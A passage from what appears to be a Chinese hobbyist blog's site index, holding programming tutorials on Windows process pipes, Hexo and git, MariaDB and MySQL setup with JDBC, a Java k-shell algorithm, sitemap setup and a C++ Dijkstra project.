ret=ShellExecuteEx(\u0026shellinfo); WaitForSingleObject(shellinfo.hProcess,INFINITE); //阻塞等待子进程执行完毕 return 0; } CreatePipe() \u0026\u0026 CreateProcess() Window API函数，理论上调用外部exe并且获得其执行输出的最佳方案，但是函数很复杂，参数众多。依旧是微软爸爸的文档\n并且本人的项目中致死都没有成功使用这个函数，个人认为是因为项目使用的SDK在多线程支持方面存在问题？？？\n本文重头戏，使用函数CreatePipe创建匿名管道将子程序输出重定向。（这里仅仅重定向输出，微软官方样例是输入输出都重定向了）微软官方样例\n函数原型\nBOOL WINAPI CreatePipe( _Out_ PHANDLE hReadPipe, //接收管道读取句柄的变量指针 _Out_ PHANDLE hWritePipe, //接收管道写句柄的变量指正 _In_opt_ LPSECURITY_ATTRIBUTES lpPipeAttributes, //指向SECURITY_ATTRIBUTES结构体的指针，该结构确定子进程是否可以继承返回的句柄。如果lpPipeAttributes为NULL，则无法继承句柄。 _In_ DWORD nSize //管道缓冲区大小 ); 返回值：如果函数成功，则返回值为非零。 BOOL CreateProcessA( LPCSTR lpApplicationName, //子程序的名称或者完整路径 LPSTR lpCommandLine, //子程序的完整路径加上命令行参数全部，如果你设置了上一个参数，这个参数只需要传入命令行参数即可。只有当上一个参数为空的时候你才需要填写子程序完整路径 LPSECURITY_ATTRIBUTES lpProcessAttributes, //子程序运行的子进程相关设置参数 LPSECURITY_ATTRIBUTES lpThreadAttributes, //子程序运行的子线程相关设置参数 BOOL bInheritHandles, //新进程是否继承父进程相关权限 DWORD dwCreationFlags, //子程序优先级相关是核定 LPVOID lpEnvironment, //指向新进程的环境块的指针。NULL，则新进程使用调用进程的环境。 LPCSTR lpCurrentDirectory, //当前进程的完整目录 LPSTARTUPINFOA lpStartupInfo, //子进程启动信息 LPPROCESS_INFORMATION lpProcessInformation //子进程信息 ); 返回值：如果函数成功，则返回值为非零。 这是两个相当复杂的参数，其中包含多个结构体，每个结构体我们还需要单独讲解。接下来直接以源码搭配注释理解\n使用匿名管道重定向外部exe输出示例：\n#include\u003ciostream\u003e #include\u003cwindows.h\u003e using namespace std; int main(){ HANDLE hRead,hWrite; //管道的读写句柄 SECURITY_ATTRIBUTES sa; //管道安全属性相关结构体 sa.nLength=sizeof(SECURITY_ATTRIBUTES); //结构体长度赋值 sa.lpSecurityDescriptor=NULL; //NULL管道默认安全描述符,管道的安全属性将继承与父程序 sa.bInheritHandle=TRUE; //一个布尔值，指定在创建新进程时是否继承返回的句柄。如果此成员为TRUE，则新进程将继承该句柄。 if(!CreatePipe(\u0026hRead,\u0026hWrite,\u0026sa,0)){ //尝试创建管道，失败则弹出提示并退出 MessageBox(NULL,\"Error on CreatePipe()\",\"WARNING\",MB_OK); return 1; } STARTUPINFO si; //启动信息结构体 PROCESS_INFORMATION pi; //进程信息结构体 si.cb=sizeof(STARTUPINFO); //初始化启动信息结构体大小 GetStartupInfo(\u0026si); //获取父进程的启动信息，利用这个函数我们可以只需要修改较少的参数值 si.hStdError=hWrite; //重定向错误信息输出到管道 si.hStdOutput=hWrite; //重定向标准输出新信息到管道 si.wShowWindow=SW_HIDE; //设定子进程窗体是否隐藏 si.dwFlags=STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES; //wShowWindow成员将包含其他信息；hStdInput，hStdOutput和hStdError成员包含其他信息。 if (!CreateProcess( \".//child.exe\", //子进程完整目录 \"argv1 argv2 argv3\", //命令行参数 NULL,NULL, TRUE, //新进程继承父进程相关权限 NULL,NULL,NULL, \u0026si, //启动信息结构体指针 \u0026pi) //进程信息结构体指针 ){ MessageBox(NULL,\"Error on CreateProcess()\",\"WARNING\",MB_OK); return 1; } CloseHandle(hWrite); //关闭管道写入句柄 string result; char buffer[4096]={0}; DWORD bytesRead; while(1){ //读取管道内的数据 if (ReadFile(hRead,buffer,4095,\u0026bytesRead,NULL)==NULL) break; result+=buffer; Sleep(200); } cout\u003c\u003cresult\u003c\u003cendl; retrun 0; } 程序运行结果 3 argv1 argv2 argv3 emmm 很有意思啊，系统认定的传入参数数量越来越少咯~\n","description":"","tags":["C/C++"],"title":"VC++调用外部exe并获取程序运行输出","uri":"/posts/vc-%E8%B0%83%E7%94%A8%E5%A4%96%E9%83%A8exe%E5%B9%B6%E8%8E%B7%E5%8F%96%E7%A8%8B%E5%BA%8F%E8%BF%90%E8%A1%8C%E8%BE%93%E5%87%BA/"},{"categories":["Code"],"content":"概述 本文的基础都建立在小站成长日记系列的基础上。本教程默认你参照小站成长日记系列之前的教程完成了相关配置 博主本人电脑双系统，考虑到在不同设备终端更新博客的需求，于是有了下面这篇文章。 实现方法简述： 使用git创建新的分支用来存放hexo博客本身 文末附kali下的小采坑 开始 坑： 如果你使用了三方主题，请把主题文件夹中的.git（可能为隐藏文件）文件夹删除。因为这个文件夹的存在会导致你后面推送的时候无法推送成功\n在你的博客目录下运行命令,初始化\ngit init 添加远程仓库\n//host 是你的远程仓库地址 git add remote origin git@host:blog.git 新建分支并切换到新建的分支\ngit checkout -b 分支名 接下来是git的基本操作，添加本地文件到git，以及提交\ngit add * git commit -m \"你的提交说明\" 将文件提交到你所创建的分支（这里我创建的分支名为hexo）\ngit push origin hexo 在你的git服务器上配置公钥 建议把准备长期使用的设备配置。（当然你不把新设备的公钥加入git服务器你也无法推送）\n在你的新设备上生成秘钥\nssh-keygen -t rsa -C \"your_email@email.com\" 将生成的公钥，即～/.ssh/id_rsa.pub文件的内容复制到git服务器的～/git/.ssh/authorized_keys文件中\n秘钥配置可以参见本博客另一篇文章 {% post_link VPS-nginx-hexo搭建个人博客 点击查看 %}\n到这里你已经完成了秘钥配置，尝试在新设备上拉取hexo分之吧。\n嗯，在新的设备上准备写博客 首先拉取hexo分支到本地\n//host你的git仓库地址 git clone -b hexo git@host:blog.git 进入到克隆下来的文件夹内，安装相应依赖\n//进入文件夹 cd blog //安装相应文件依赖 npm install 当然这里要保证你新的设别上具有git以及node.js框架\n博客写完之后进行的操作\n//博客的编译部署操作 hexo clean \u0026\u0026 hexo g \u0026\u0026 hexo d //添加文件 git add * //提交 git commit -m \"你的提交说明\" //先拉取远程仓库的文件对比合并 git pull origin hexo //解决版本冲突之后推送到hexo分支 git push origin hexo 在任意一台电脑上都别忘了拉取分支确保版本的一致性哦\ngit pull origin hexo 小插曲 坑 这里任意一台新设备也是需要安装好nodejs以及npm的。这里补充一个小插曲\n博主电脑双系统是win+kali的组合\nkali这个小奇葩自带nodejs的，在命令行直接输入node -v是由回显的。然而输入npm提示命令不存在\n于是乎四处寻找有关修复这个bug的方法（其实也不算bug）\n网上多数教程linux下安装npm都是去nodejs官网下载安装。即使是直接面向kali的也是\n但是其实apt的源中包含了npm，直接使用包管理安装即可\n//确保系统最新 apt update \u0026\u0026 apt upgrade -y \u0026\u0026 reboot //安装缺少的npm apt install npm -y 安装完成之后再尝试输入npm就有回显说明安装完成了。\n","description":"","tags":["建站"],"title":"多终端更新hexo博客配置方法","uri":"/posts/%E5%A4%9A%E7%BB%88%E7%AB%AF%E6%9B%B4%E6%96%B0hexo%E5%8D%9A%E5%AE%A2%E9%85%8D%E7%BD%AE%E6%96%B9%E6%B3%95/"},{"categories":["Code"],"content":"摘要 Centos7 下安装mariaDB数据库的操作记录。 MariaDB数据库是mysql的衍生版。centos发行版在centos6之后就将默认数据库改为了mariadb。因为MySQL被甲骨文公司收购后存在闭源风险 这次安装的目的，也是处于小站之后的发展考虑。 安装 linux服务器，阿里云的ECS\n[root@host /]# lsb_release -a LSB Version: :core-4.1-amd64:core-4.1-noarch Distributor ID: CentOS Description: CentOS Linux release 7.6.1810 (Core) Release: 7.6.1810 Codename: Core 使用阿里云linux服务器默认的yum源安装，因此也没什么折腾的，简单几条命令\nyum install mariadb mariadb-server -y 配置 启动数据库\nsystemctl start mariadb 设置数据库开机自启\nsystemctl enable mariadb Mariadb数据库自带了初始化命令，使用命令之后以找操作进行即可。这里是使用的安全安装命令，安装过程中会提示设置密码等\nmysql_secure_installation 以下是log记录辅以注释 [root@host /]# mysql_secure_installation NOTE: RUNNING ALL PARTS OF THIS SCRIPT IS RECOMMENDED FOR ALL MariaDB SERVERS IN PRODUCTION USE! PLEASE READ EACH STEP CAREFULLY! In order to log into MariaDB to secure it, we'll need the current password for the root user. If you've just installed MariaDB, and you haven't set the root password yet, the password will be blank, so you should just press enter here. # 输入数据库root用户名密码，初始默认为空 Enter current password for root (enter for none): ERROR 1045 (28000): Access denied for user 'root'@'localhost' (using password: YES) Enter current password for root (enter for none): OK, successfully used password, moving on... Setting the root password ensures that nobody can log into the MariaDB root user without the proper authorisation. # 是否设置用户名密码？ 是 Set root password? [Y/n] Y New password: Re-enter new password: Password updated successfully! Reloading privilege tables.. ... Success! By default, a MariaDB installation has an anonymous user, allowing anyone to log into MariaDB without having to have a user account created for them. This is intended only for testing, and to make the installation go a bit smoother. You should remove them before moving into a production environment. # 是否移除匿名用户？ 是 Remove anonymous users? [Y/n] Y ... Success! Normally, root should only be allowed to connect from 'localhost'. This ensures that someone cannot guess at the root password from the network. # 禁止root用户从远程登陆，仅允许本地登录 是 Disallow root login remotely? [Y/n] Y ... Success! By default, MariaDB comes with a database named 'test' that anyone can access. This is also intended only for testing, and should be removed before moving into a production environment. # 移除测试用数据库 是 Remove test database and access to it? [Y/n] Y - Dropping test database... ... Success! - Removing privileges on test database... ... Success! Reloading the privilege tables will ensure that all changes made so far will take effect immediately. # 重新加载权限列表 是 Reload privilege tables now? [Y/n] Y ... Success! Cleaning up... All done! If you've completed all of the above steps, your MariaDB installation should now be secure. Thanks for using MariaDB! 至此，mariadb数据库的安装基本完成。本文参考连接\n使用如下命令登陆数据库。\nmysql -u root -p ","description":"","tags":["Linux","数据库"],"title":"Centos 7 yum安装Mariadb","uri":"/posts/centos-7-yum%E5%AE%89%E8%A3%85mariadb/"},{"categories":["Code"],"content":"摘要 基于windows下mysql 8.0.*版本安装以及配置等操作介绍 基本安装 初始化 密码重置 创建数据库 创建列表 以及书本《Java简明教程》实列代码的采坑 安装 从mysql官网下载mysql社区版本\n这里选择的时二进制安装文件，就是需要配置环境变量的那种下载 下载的时候选择第一个，第二个是测试版。坑：在你点击下载之后会教你login一类的，你可以忽略它们找到下面一排英文“No thanks,just start my download”就可以正式下载\n下载完成之后解压，将这个文件夹放到你想要的位置，列如E盘下。接着根据你选择的位置配置环境变量。如：\nE:\\mysql-8.0.13-winx64\\bin 不会配置环境变量？？？\n如果你是用可执行安装包安装，即msi文件安装请参照这个\n配置 进入myql的安装目录（就是你放加压后文件夹的地方）,找到里面的bin文件夹。\n在该文件夹下点击窗体左上方文件 -\u003e 找到“打开powershell” -\u003e 选择“以管理员身份打开powershell” -\u003e 运行如下命令\nmysqld --initialize-insecure --console --initialize-insecure参数是为了初始化一个没有初始密码的数据库\n--console参数显示初始化结果，方便出现问题后应对。\n如果你初始化失败，请把错误信息给你想要请教的人看，而不是直接告诉别人你安装不了，掌握问问题的方法也很关键。\n坑：出现缺少XXX140.dll，请安装这个\n类似问题安装c++运行库解决\n坑：初始化提示无法读写文件，创建文件问题。确保你是管理员权限的命令行\n坑：初始化失败，可以尝试删除mysql安装文件夹下的data文件夹重试\n你也可以使用这个命令初始化mysql\nmysqld --initialize --console 这个命令在初始化过程中（如果成功）会输出一个随机密码，请务必记住他，否则你就得尝试重置密码了。\n安装服务\n在上一步执行没有报错之后，继续输入\nmysqld install 安装mysql的系统服务，再次重申，请确保你的命令行具有管理员权限！！！\n启动服务\nnet start mysql 坑:提示启动失败请尝试删除mysql服务 mysqld remove 并回到第一步重新初始化（这个过程中可能还需要删除mysql安装目录中的data文件夹）\n第一次启动数据库修改密码\n如果你是使用了--initialize-insecure参数初始化的数据库的话，那么数据库默认没有密码，直接在命令行输入\nmysql -u root -p 出现输入密码提示后按下回车即可。\n使用--initialize参数初始化的请输入初始化过程中输出的随机密码\n修改密码\nALTER user 'root'@'local' IDENTIFIED BY 'your_password你的密码'; 坑:数据库命令大小写其实无所谓，可以都是小写。别忘了末尾的分号\n数据库的基本操作:\n新建数据库 create database 你要新建的数据库的名字; 展示所有数据库 show databases; 切换数据库 use 你要切换的数据库的名字 坑:这里有没有分号无所谓，其他数据库语句必须分号结尾\n新建表 create table 表名(key1 key_type,key2 key_type,key3 key_type); 实例： create table student(no VARCHAR(20,name VARCHAR(20),math INT,average DOUBLE); 展示表中所有数据： select * from 表名; 打印表内数据格式： desc 表名; 更多命令\n坑:数值类型详解\n坑:请先切换到你要创建表的数据库再执行创建表明操作\njava连接数据库 在mysql官网下载mysql connector的java sdk.请按照你的数据库版本下载对应的connector 下载地址\n“Select Operating System”选项请选择“Platform Independent”.\n下载第一个还是第二个只是压缩包格式的不同\n下载点击进去之后请点击“No thanks, just start my download.”开始下载\n下载完成之后解压，打开解压后的文件夹，找到一个*.jar后缀的文件列如：\nmysql-connector-java-8.0.13.jar 将该文件复制到你的eclipse中的java项目里\n坑:什么你不知道你的eclipse项目目录在哪里？？？默认就在c:\\用户\\你的用户名\\eclise-workplace里，对，打开哪个文件夹，找到你写的那个项目的名字，把这个jar文件放进去！！！\n将jar文件加入你的java项目\n在eclipse里右键你写的项目，选择new-\u003e选择Sourse Folder，随便起个名字你开心就好-\u003e把你的那个jar文件再放进去（别问我怎么放，打开你的电脑） 百度知道图解（百度知道没有选择创建source folder文件夹，我建议你这里选择这个）\n书本范例代码的问题\n新版的mysql数据库connector驱动包全名： com.mysql.cj.jdbc.Driver 数据库连接url格式： jdbc:mysql://localhost:3306/数据库名称?serverTimezone=UTC 坑:mysql8.0.x新版在java调用时要增加参数化serverTimezone=UTC，设置数据库时间为世界标准时间，否则会报以下错误\nCaused by: java.sql.SQLException: The server time zone value '�й���׼ʱ��' is unrecognized or represents more than one time zone. You must configure either the server or JDBC driver (via the serverTimezone configuration property) to use a more specifc time zone value if you want to utilize time zone support. 连接数据库出现access deny字样 DriverManger.getConnection(DB_URL,USER,PASS) DB_URL就是上面提到的url格式内容。\nUSER默认\"root\",PASS如果为空则使用空字符串即可，有密码请确保密码正确\n数据库连接代码示例 请确保已经将mysqlconnector加入项目构建目录，参照将jar文件加入你的java项目 public class MySQLDemo { // JDBC 驱动名及数据库 URL static final String JDBC_DRIVER = \"com.mysql.cj.jdbc.Driver\"; static final String DB_URL = \"jdbc:mysql://localhost:3306/RUNOOB\";//RUNOOB为数据库（database）名称 // 数据库的用户名与密码，需要根据自己的设置 static final String USER = \"root\"; static final String PASS = \"123456\"; public static void main(String[] args) { Connection conn = null; Statement stmt = null; try{ // 注册 JDBC 驱动 Class.forName(\"com.mysql.cj.jdbc.Driver\"); // 打开链接 System.out.println(\"连接数据库...\"); conn = DriverManager.getConnection(DB_URL,USER,PASS); // 执行查询 System.out.println(\" 实例化Statement对象...\"); stmt = conn.createStatement(); String sql; sql = \"SELECT id, name, url FROM websites\";//构建sql语句 id name url均为字段名 websites表名 ResultSet rs = stmt.executeQuery(sql);//执行sql语句并获取返回结果 // 展开结果集数据库 while(rs.next()){ // 通过字段检索 int id = rs.getInt(\"id\"); String name = rs.getString(\"name\"); String url = rs.getString(\"url\"); // 输出数据 System.out.print(\"ID: \" + id); System.out.print(\", 站点名称: \" + name); System.out.print(\", 站点 URL: \" + url); System.out.print(\"\\n\"); } // 完成后关闭 rs.close(); stmt.close(); conn.close(); }catch(SQLException se){ // 处理 JDBC 错误 se.printStackTrace(); }catch(Exception e){ // 处理 Class.forName 错误 e.printStackTrace(); }finally{ // 关闭资源 try{ if(stmt!=null) stmt.close(); }catch(SQLException se2){ }// 什么都不做 try{ if(conn!=null) conn.close(); }catch(SQLException se){ se.printStackTrace(); } } System.out.println(\"Goodbye!\"); } } ","description":"","tags":["数据库"],"title":"mysql8的安装配置以及JDBC使用","uri":"/posts/mysql8%E7%9A%84%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE%E4%BB%A5%E5%8F%8Ajdbc%E4%BD%BF%E7%94%A8/"},{"categories":["Code"],"content":"摘要 本文章是基于个人对k-shell算法的理解，若有偏颇还望指正。 基于java实现的k-shell算法，文末附源码，仅供学习。 k-shell算法 从数据结构图中逐步删除节点权值小于某阈值的节点以及其相关路径的算法\nK-shell 方法递归地剥离网络中度数小于或等于 k 的节点,具体划分过程如下: 假设网络中不存在度数为 0 的孤立节点。从度指标的角度分析,度数为 1的节点是网络中最不重要的节点,因此首先将度数为 1 的节点及其连边从网络中删除。删除操作进行之后的网络中会出现新的度数为 1 的节点,接着将这些新出现的度数为 1 的节点及其连边删除。重复上述操作,直到网络中不再新出现度数为 1的节点为止。此时所有被删除的节点构成第一层,即 1-shell,节点的 Ks 值等于 1。剩下的网络中,每个节点的度数至少为2。继续重复上述删除操作,得到 Ks 值等于 2 的第二层,即 2-shell。依此类推,直到网络中所有的节点都被赋予 Ks 值。 出处\n关于k-shell算法的一些小问题，目前为止本人未能找到足够官方的文章讲解。若有人能指正，感激不尽。\n节点的度在图的定义中可以理解为节点与其他节点的路径数目。在我们删除对应度数节点的过程中势必会又节点度数更大的节点变为度数小的节点。这样节点的度数就会改变，对于这种改变发生而产生的低于当前处理度数k的新节点又应该怎样处理？\n本代码对这类节点，这个代码处理时在删除当前所有节点度数小于等于ks值的节点，并把删除节点加入ks值。针对此次提供的数据ks层数最大值为12。实验数据以及实验结果将会附在源代码末尾\n数据结构安排 以下代码使用vscode+java环境编写\n因为是使用的java语言。这里用一个hashmap来存储图。hashmap中key，value分别为string，以及hashset。 key值中存储图节点，对应value（hashset型）存储与该节点有连接的节点。\nHashMap\u003cString,HashSet\u003cString\u003e\u003e map=new HashMap\u003cString,HashSet\u003cString\u003e\u003e(); 用另一个hashmap来存储对应k值的网络层,key值用来存放k值，value的hashset里面存放从网络中剔除的节点。\nHashMap\u003cInteger,HashSet\u003cString\u003e\u003e kmap=new HashMap\u003cInteger,HashSet\u003cString\u003e\u003e(); 首先第一步从文件中读取数据,这里操作时按行读取。java文件操作\nprivate static void loadfile(String filename){ map.clear(); //将图清空重置 try { File f=new File(filename); //尝试打开文件 FileInputStream fstream=new FileInputStream(f); InputStreamReader ireader=new InputStreamReader(fstream); BufferedReader breader=new BufferedReader(ireader); String line=\"\"; //存储每一行的数据 String a=\"\"; //存储逗号左边 String b=\"\"; //存储逗号右边 String[] points;//存储行数据分割之后的内容 HashSet\u003cString\u003e temp=null; while ((line=breader.readLine())!=null){ points=line.split(\",\"); //以逗号分割字符串 a=points[0]; b=points[1]; temp=map.get(a); if (temp!=null){ //这里的读取操作有点绕 temp.add(b); //将逗号前面的节点当作key值在map中检索，如果存在对应的value } //就把逗号后面的节点存入这个key值所对应的value中 else{ //如果不存在，证明map中还没有这个节点的信息。 temp=new HashSet\u003cString\u003e(); temp.add(b); //则将逗号前面的节点作为key map.put(a, temp); //逗号后面的节点作为value中的元素存入map中 } temp=map.get(b); //这里将逗号前后对换位置重复一遍，保证map的key值中包含所有的节点 if (temp!=null){ temp.add(a); } else{ temp=new HashSet\u003cString\u003e(); temp.add(a); map.put(b, temp); } } breader.close(); } catch (Exception e) { //TODO: handle exception e.printStackTrace(); } } 为了方便查看图的变化这里写了一个map的打印函数：\nprivate static void mapprint(){ Iterator iter=map.entrySet().iterator(); while (iter.hasNext()){ Map.Entry\u003cString,HashSet\u003cString\u003e\u003e entry=(Map.Entry\u003cString,HashSet\u003cString\u003e\u003e) iter.next(); System.out.println(entry.getKey()+\" \"+entry.getValue().toString()); } } 以及存储对应k值剥离出来的网络节点的打印函数\nprivate static void printkmap(){ Iterator iter=kmap.entrySet().iterator(); while(iter.hasNext()){ Map.Entry\u003cInteger,HashSet\u003cString\u003e\u003e entry=(Map.Entry\u003cInteger,HashSet\u003cString\u003e\u003e) iter.next(); System.out.println(entry.getKey().toString()+\" \"+entry.getValue().toString()); } } k-shell算法。\n以图（hashmap为空为终止条件）为空为终止条件的循环。每次删除节点权值小于k的节点以及相应路径，在图（hashmap）一轮遍历完成之后k值+1。 删除的时候要注意，这样的存储结构的设计模式，我们删除一个节点时，要同时把该节点从其他与该节点相连接的节点的value中删除。因此这里的删除函数显得很复杂。 Hashmap的遍历删除操作\nprivate static void kshell_func(){ int k=1; kmap.clear(); while (!map.isEmpty()){ HashSet\u003cString\u003e ktemp=new HashSet\u003cString\u003e(); for (Iterator\u003cMap.Entry\u003cString,HashSet\u003cString\u003e\u003e\u003e iter = map.entrySet().iterator(); iter.hasNext();){ Map.Entry\u003cString,HashSet\u003cString\u003e\u003e item = iter.next(); if (item.getValue().size()\u003c=k){ ktemp.add(item.getKey()) for (String i:item.getValue()){ HashSet\u003cString\u003e temp=map.get(i); temp.remove(item.getKey()); } iter.remove(); } } // Iterator iter=map.entrySet().iterator(); // Map.Entry\u003cString,HashSet\u003cString\u003e\u003e entry=(Map.Entry\u003cString,HashSet\u003cString\u003e\u003e) iter.next(); // while (iter.hasNext()){ // if (entry.getValue().size()\u003c=k){ // ktemp.add(entry.getKey()); // for (String index:entry.getValue()){ // HashSet\u003cString\u003e temp=map.get(index); // temp.remove(entry.getKey()); // } // String keytemp=entry.getKey(); // entry=(Map.Entry\u003cString,HashSet\u003cString\u003e\u003e) iter.next(); // map.remove(keytemp); // System.out.println(\"delete ...\"); // } // } kmap.put(Integer.valueOf(k),ktemp); k=k+1; } } 源码 数据文件\n结果文件\nimport java.io.BufferedReader; import java.io.File; import java.io.FileInputStream; import java.io.InputStreamReader; import java.util.HashMap; import java.util.HashSet; import java.util.Iterator; import java.util.Map; import java.lang.Integer; public class kshell{ private static HashMap\u003cString,HashSet\u003cString\u003e\u003e map=new HashMap\u003cString,HashSet\u003cString\u003e\u003e(); private static HashMap\u003cInteger,HashSet\u003cString\u003e\u003e kmap=new HashMap\u003cInteger,HashSet\u003cString\u003e\u003e(); private static void loadfile(String filename){ map.clear(); try { File f=new File(filename); FileInputStream fstream=new FileInputStream(f); InputStreamReader ireader=new InputStreamReader(fstream); BufferedReader breader=new BufferedReader(ireader); String line=\"\"; String a=\"\"; String b=\"\"; String[] points; HashSet\u003cString\u003e temp=null; while ((line=breader.readLine())!=null){ points=line.split(\",\"); a=points[0]; b=points[1]; temp=map.get(a); if (temp!=null){ temp.add(b); } else{ temp=new HashSet\u003cString\u003e(); temp.add(b); map.put(a, temp); } temp=map.get(b); if (temp!=null){ temp.add(a); } else{ temp=new HashSet\u003cString\u003e(); temp.add(a); map.put(b, temp); } } breader.close(); } catch (Exception e) { //TODO: handle exception e.printStackTrace(); } } private static void mapprint(){ Iterator iter=map.entrySet().iterator(); while (iter.hasNext()){ Map.Entry\u003cString,HashSet\u003cString\u003e\u003e entry=(Map.Entry\u003cString,HashSet\u003cString\u003e\u003e) iter.next(); System.out.println(entry.getKey()+\" \"+entry.getValue().toString()); } } private static void kshell_func(){ int k=1; kmap.clear(); while (!map.isEmpty()){ HashSet\u003cString\u003e ktemp=new HashSet\u003cString\u003e(); for (Iterator\u003cMap.Entry\u003cString,HashSet\u003cString\u003e\u003e\u003e iter = map.entrySet().iterator(); iter.hasNext();){ Map.Entry\u003cString,HashSet\u003cString\u003e\u003e item = iter.next(); if (item.getValue().size()\u003c=k){ ktemp.add(item.getKey()) for (String i:item.getValue()){ HashSet\u003cString\u003e temp=map.get(i); temp.remove(item.getKey()); } iter.remove(); } } // Iterator iter=map.entrySet().iterator(); // Map.Entry\u003cString,HashSet\u003cString\u003e\u003e entry=(Map.Entry\u003cString,HashSet\u003cString\u003e\u003e) iter.next(); // while (iter.hasNext()){ // if (entry.getValue().size()\u003c=k){ // ktemp.add(entry.getKey()); // for (String index:entry.getValue()){ // HashSet\u003cString\u003e temp=map.get(index); // temp.remove(entry.getKey()); // } // String keytemp=entry.getKey(); // entry=(Map.Entry\u003cString,HashSet\u003cString\u003e\u003e) iter.next(); // map.remove(keytemp); // System.out.println(\"delete ...\"); // } // } kmap.put(Integer.valueOf(k),ktemp); k=k+1; } } private static void printkmap(){ Iterator iter=kmap.entrySet().iterator(); while(iter.hasNext()){ Map.Entry\u003cInteger,HashSet\u003cString\u003e\u003e entry=(Map.Entry\u003cInteger,HashSet\u003cString\u003e\u003e) iter.next(); System.out.println(entry.getKey().toString()+\" \"+entry.getValue().toString()); } } public static void main(String[] args) { loadfile(\"./data.txt\"); //mapprint(); kshell_func(); //mapprint(); printkmap(); System.out.println(\"complete\"); } } ","description":"","tags":["算法","象牙塔"],"title":"k-shell算法Java实现","uri":"/posts/k-shell%E7%AE%97%E6%B3%95java%E5%AE%9E%E7%8E%B0/"},{"categories":["Code"],"content":"摘要 本文介绍了如何让搜索引擎可以搜索本站，小站成长的一步~ 搜索引擎检索至少需要你的网站有域名（不建议没有域名）因此国内就需要进行备案等等一系列的操作，如果尚未备案的可以完成备案之后再尝试。 建立站点地图 在本地博客文件夹路径内运行代码如下，安装站点地图生成插件:\nnpm install hexo-generator-sitemap --save npm install hexo-generator-baidu-sitemap --save 分别安装hexo站点地图生成插件，对应的分别是百度的站点地图生成以及Google粑粑的站点地图。\n构建网站，检查在public文件夹中是否产生sitemap.xml，baidusitemap.xml。存在表明站地图生成成功。\n在source文件夹下新建robots.txt文件 什么是robots.txt\nUser-agent: * Sitemap: http://aleonchen.com/sitemap.xml Sitemap: http://aleonchen.com/baidusitemap.xml 重新构架并发布你的网站\nhexo g -d 向搜索引擎注册你的网站 备注：这里使用html的认证方法\nGoogle 提交入口\n百度提交入口\n下载搜索引擎提供的html文件 添加到博客下的source文件夹内 构建发布之后在搜索引擎提交入口完成认证,等待搜索引擎完成数据更新之后即可在搜索引擎中找到你的站点。 坑： 直接这样加入source里构建并发布会会导致在访问这个html文件的时候被hexo本身重定向。如果你出现了重定向问题，请参照如下方式:\n在source文件夹下搜索引擎提供的html首部加入:\nlayout: false --- 这样可以标识hexo停用ta的渲染，就不会重定向了.\n之后重新构建发布网站即可\n","description":"","tags":["网站搭建"],"title":"Blog搜索引擎可发现","uri":"/posts/%E5%B0%8F%E7%AB%99%E6%88%90%E9%95%BF-%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E5%8F%AF%E5%8F%91%E7%8E%B0/"},{"categories":["Code"],"content":" Dijkstra算法课设 数据结构课程中的经典算法。我会将一些程序系统设计过程中的一些小细节问题（暂且称之为小细节把，因为我也不知道拿什么次比较准确），并在最后附上程序所有源码。作为一个曾经的苟若的算法狗（现在依旧小垃圾）,很多数据结构在实现的时候没必要照抄《数据结构》书上那套迂腐的东西，那终究是伪代码，而且反人类当然如果你就是十分喜欢结构体的使用的话不拦着你。\n很多东西是编程的一些编程习惯，多敲，多理解，遇到bug不要第一件事情是想着找别人问。程序员需要的是自己解决问题的能力（当然也不是一味的钻牛角尖，这就是中庸的事情了） 我的某个好友问我你看到程序报错的第一反应是什么，ta的回答是问老师，我是真的无话可讲了\n以下代码基于c++ 课设要求 结点数可改变(可增加或删除城市及相关弧) 弧的权值可改变(输入有弧的两个城市名称，修改相应权值) 源点固定，输入不同终点时，能输出最短路径长度及路径(以城市名称表示) 初始图至少包括6个城市 设计简单菜单能进行操作选择 数据结构的选用 存储图的数据结构书上讲解了三种，这里选择的是使用实现起来最简单的邻接矩阵。\n#defin MAXSIZE 256 int map[MAXSIZE][MAXSIZE]; 当然你也可以选择使用邻接表，那就是挑战自己的事情。邻接表的好处是在图边数较为少的时候可以用更少的存储空间,但是邻接矩阵在访问速度，效率上高很多（所谓空间换时间233）\n邻接矩阵的初始化。\n因为假定城市之间是无向图，那么邻接矩阵应该是呈现出以对角线对称的趋势(因为map [y]的值等于map[y] 因为我们这里认为这两个是一个路径，一个弧边)。我们把城市x到城市x自己的权值赋值为0，把城市x到城市y有路径的城市赋值为对应权值。城市间没有路径的话我们赋值权值为一个最大值0x7FFFFFFF,这又便于我们下面的Dijkstra算法进行\n当然为了打印邻接矩阵看着漂亮，在打印邻接矩阵的时候使用-代替了0x7FFFFFFF数据\n还需要一个String数组来存储我们可能包含中文的城市名，数组的下标就对应邻接矩阵中的下标。\nString Citylist[MAXSIZE]; 因为采用了邻接矩阵存储图，那么删除城市节点的时候只需要删除对应的邻接矩阵中的行和列,以及存储城市名称数组中的对应位置，增加城市节点以及修改城市节点同理，都是通过遍历城市名称遍历得到城市编号，借由编号访问位于邻接矩阵中城市之间的权值：\n以下是删除二维矩阵（邻接矩阵中行和列的操作，以及删除城市名称数组的操作）\nvoid Delcol(int x) { int i,j; if (x\u003eN or x\u003c1) return; for (i=1; i\u003c=N; i++) { for (j=x; j\u003cN; j++) map[i][j]=map[i][j+1]; map[i][j]=0; } } void Delrow(int x) { int i; if (x\u003eN or x\u003c1) return; for (i=x; i\u003cN; i++) memcpy(map[i],map[i+1],sizeof(int)*(N)); memset(map[i],0,N-1); } void Delname(int x) { int i; for (i=x; i\u003cN; i++) CityList[i]=CityList[i+1]; CityList[i]= {0}; } void Mapdel() { int x; cout\u003c\u003c\"请输入您要删除的城市编号:\"; cin\u003e\u003ex; Delname(x); Delcol(x); Delrow(x); N--; } 关于Dijkstra算法的详解\n首先还是从数据存储结构的设计入手。我们需要一个一维bool数组存储每个节点是否被访问过。并在寻路算法开始的时候初始化其内瓤 其次，我们需要一个一维数组来存储从出发点到每个节点的路径长度 最后，创建一个String数组来存储我们的路径 关于Dijkstra算法理论的详解，我不是一个好老师，讲不清楚，就鸽了吧。当然数据结构的设计首先得理解算法思路。Dijkstra算法详解(这个详解还是不错的，已经从很多提问里看出来这个博客的影子了) 源码实现 仅供学习 代码里为了完成课设某个要求智障的初始化函数还请无视(☆-ｖ-)\n代码可能有很多智障的bug，毕竟也是写个课设交完报告就完事的，若有高见，还望指正。谢谢(●ˇ∀ˇ●)\n#include\u003ciostream\u003e #include\u003ccstdio\u003e #include\u003ccstring\u003e #include\u003cconio.h\u003e #define MAXLEN 500 #define MAX 0x7FFFFFFF using namespace 